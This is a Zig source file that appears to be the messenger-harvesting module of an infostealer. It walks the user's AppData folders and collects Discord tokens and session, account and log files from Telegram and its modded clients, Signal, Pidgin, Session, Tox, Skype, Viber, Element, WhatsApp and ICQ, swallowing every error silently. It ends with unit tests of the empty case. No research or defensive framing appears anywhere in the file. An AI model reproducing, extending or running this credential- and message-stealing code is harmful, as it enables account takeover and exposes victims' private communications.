const std = @import("std");
const discord = @import("discord.zig");
const telegram = @import("telegram.zig");
const telegram_mods = @import("telegram_mods.zig");
const signal = @import("signal.zig");
const pidgin = @import("pidgin.zig");
const session = @import("session.zig");
const tox = @import("tox.zig");
const skype = @import("skype.zig");
const viber = @import("viber.zig");
const element = @import("element.zig");
const whatsapp = @import("whatsapp.zig");
const icq = @import("icq.zig");

pub const MessengerData = struct {
    discord_tokens: [][]const u8,
    telegram_files: [][]const u8,
    telegram_mod_files: [][]const u8,
    signal_files: [][]const u8,
    pidgin_accounts: [][]const u8,
    pidgin_logs: [][]const u8,
    session_files: [][]const u8,
    tox_files: [][]const u8,
    skype_files: [][]const u8,
    viber_files: [][]const u8,
    element_files: [][]const u8,
    whatsapp_files: [][]const u8,
    icq_files: [][]const u8,
};

fn freeStrings(list: [][]const u8, allocator: std.mem.Allocator) void {
    for (list) |s| allocator.free(s);
    allocator.free(list);
}

pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local_app_data: []const u8) !MessengerData {
    const discord_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "discord" });
    defer allocator.free(discord_path);
    const discord_tokens = discord.collect(allocator, discord_path) catch try allocator.alloc([]const u8, 0);

    const telegram_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "Telegram Desktop" });
    defer allocator.free(telegram_path);
    const telegram_files = telegram.collect(allocator, telegram_path) catch try allocator.alloc([]const u8, 0);

    const telegram_mod_files = telegram_mods.collect(allocator, roaming_app_data, local_app_data) catch try allocator.alloc([]const u8, 0);

    const signal_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "Signal" });
    defer allocator.free(signal_path);
    const signal_files = signal.collect(allocator, signal_path) catch try allocator.alloc([]const u8, 0);

    const pidgin_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, ".purple" });
    defer allocator.free(pidgin_path);
    const pidgin_result = pidgin.collect(allocator, pidgin_path) catch pidgin.MessengerResult{
        .accounts = try allocator.alloc([]const u8, 0),
        .log_files = try allocator.alloc([]const u8, 0),
    };

    const session_files = session.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
    const tox_files = tox.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
    const skype_files = skype.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
    const viber_files = viber.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
    const element_files = element.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
    const whatsapp_files = whatsapp.collect(allocator, local_app_data) catch try allocator.alloc([]const u8, 0);
    const icq_files = icq.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);

    return MessengerData{
        .discord_tokens = discord_tokens,
        .telegram_files = telegram_files,
        .telegram_mod_files = telegram_mod_files,
        .signal_files = signal_files,
        .pidgin_accounts = pidgin_result.accounts,
        .pidgin_logs = pidgin_result.log_files,
        .session_files = session_files,
        .tox_files = tox_files,
        .skype_files = skype_files,
        .viber_files = viber_files,
        .element_files = element_files,
        .whatsapp_files = whatsapp_files,
        .icq_files = icq_files,
    };
}

test "collect returns empty result for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__roaming", "C:\\__nonexistent__local");
    defer {
        freeStrings(result.discord_tokens, std.testing.allocator);
        freeStrings(result.telegram_files, std.testing.allocator);
        freeStrings(result.telegram_mod_files, std.testing.allocator);
        freeStrings(result.signal_files, std.testing.allocator);
        freeStrings(result.pidgin_accounts, std.testing.allocator);
        freeStrings(result.pidgin_logs, std.testing.allocator);
        freeStrings(result.session_files, std.testing.allocator);
        freeStrings(result.tox_files, std.testing.allocator);
        freeStrings(result.skype_files, std.testing.allocator);
        freeStrings(result.viber_files, std.testing.allocator);
        freeStrings(result.element_files, std.testing.allocator);
        freeStrings(result.whatsapp_files, std.testing.allocator);
        freeStrings(result.icq_files, std.testing.allocator);
    }
    try std.testing.expectEqual(@as(usize, 0), result.discord_tokens.len);
    try std.testing.expectEqual(@as(usize, 0), result.telegram_files.len);
    try std.testing.expectEqual(@as(usize, 0), result.signal_files.len);
    try std.testing.expectEqual(@as(usize, 0), result.pidgin_accounts.len);
    try std.testing.expectEqual(@as(usize, 0), result.session_files.len);
    try std.testing.expectEqual(@as(usize, 0), result.tox_files.len);
    try std.testing.expectEqual(@as(usize, 0), result.icq_files.len);
}

test "MessengerData default is empty" {
    const md = MessengerData{
        .discord_tokens = &.{}, .telegram_files = &.{}, .telegram_mod_files = &.{},
        .signal_files = &.{}, .pidgin_accounts = &.{}, .pidgin_logs = &.{},
        .session_files = &.{}, .tox_files = &.{}, .skype_files = &.{},
        .viber_files = &.{}, .element_files = &.{}, .whatsapp_files = &.{},
        .icq_files = &.{},
    };
    try std.testing.expectEqual(@as(usize, 0), md.discord_tokens.len);
    try std.testing.expectEqual(@as(usize, 0), md.session_files.len);
}
